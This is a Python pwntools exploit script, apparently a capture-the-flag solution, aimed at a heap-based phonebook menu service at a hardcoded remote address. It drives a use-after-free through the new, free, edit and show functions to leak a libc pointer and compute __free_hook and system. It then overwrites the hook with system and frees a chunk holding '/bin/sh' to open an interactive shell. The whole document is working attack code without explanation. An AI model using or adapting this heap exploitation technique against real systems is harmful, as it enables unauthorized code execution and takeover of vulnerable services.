from pwn import *

p = remote("61.147.171.105",50129)

def new(number, name, size, con):
    p.recvuntil("your choice>>")
    p.send("1")
    p.recvuntil("phone number:")
    p.sendline(number)
    p.recvuntil("name:")
    p.sendline(name)
    p.recvuntil("input des size:")
    p.sendline(str(size))
    p.recvuntil("des info:")
    p.sendline(con)


def free(idx):
    p.recvuntil("your choice>>")
    p.send("2")
    p.recvuntil("input index:")
    p.sendline(str(idx))


def show(idx):
    p.recvuntil("your choice>>")
    p.send("3")
    p.recvuntil("input index:")
    p.sendline(str(idx))


def edit(idx, number, name, con):
    p.recvuntil("your choice>>")
    p.send("4")
    p.recvuntil("input index:")
    p.sendline(str(idx))
    p.recvuntil("phone number:")
    p.sendline(number)
    p.recvuntil("name:")
    p.sendline(name)
    p.recvuntil("des info:")
    p.send(con)

# leak
new("1", "1", 0x80, "aaaa")
new("1", "1", 0x60, "aaaa")
new("1", "1", 0x20, "/bin/sh\x00")
free(0)
edit(0, "a"*0x10, "a"*12, "")
show(0)
# print(p.recv())
p.recvuntil("\ndes:")
info = p.recvuntil("\n", drop=True)
info = u64(info.ljust(8, b"\x00"))
print(hex(info))

# count
m_hook = info-0x68
f_hook = m_hook+0x1c98
print("f_hook: ", hex(f_hook))
print("m_hook", hex(m_hook))
sys = info-0x68-0x37f770
print("sys: ", hex(sys))

# attack
edit(1, "a"*0x10, b"a"*13+p64(f_hook), p64(sys))
free(2)

p.interactive()
